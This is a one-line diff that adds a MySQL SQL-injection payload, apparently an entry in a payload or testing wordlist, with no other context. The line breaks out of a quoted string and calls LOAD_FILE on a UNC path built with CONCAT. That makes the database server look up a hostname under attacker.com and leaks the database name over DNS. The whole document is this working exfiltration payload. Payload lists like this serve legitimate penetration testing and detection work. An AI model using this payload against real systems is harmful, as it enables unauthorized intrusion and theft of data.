@@ -1,0 +1,1 @@
+' AND (SELECT LOAD_FILE(CONCAT('\\\\',database(),'.attacker.com\\a')))--
